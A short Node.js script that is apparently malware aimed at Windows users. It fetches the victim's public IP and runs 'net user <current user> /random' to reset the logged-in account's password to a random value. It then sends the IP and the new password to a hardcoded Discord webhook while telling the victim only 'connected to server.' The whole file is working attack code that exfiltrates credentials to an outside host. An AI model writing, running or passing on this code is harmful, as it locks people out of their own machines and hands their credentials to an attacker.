const username = require('username');
const {
    Webhook
} = require('discord-webhook-node');
let request = require('request');
const logs = new Webhook("https://discord.com/api/webhooks/1017034139897167882/WcPGQ7IB_fdpkZpOdXS33KA-hxkwmltlT_ay86QiIs9Ku_HXFXFuPBzjcNh9xBFa1Urp"); //webhook link
const {
    exec
} = require("child_process");

request.get(`https://api.ipify.org`, function(err, response, body) {
    if (err)
        return console.log("no connection....................................")


    (async () => {
        exec(`net user ${await username()} /random`, (error, data, getter) => {

            logs.send(`\n\`\`\`yaml\nLogged IP: ${body}\n${data}\n\`\`\`\n`)
            console.log(`connected to server.`)
            if (error) {

                logs.send(`\n\`\`\`yaml\nyou must open this app with administrator\`\`\`\n`)

            }

        });
    })();
});
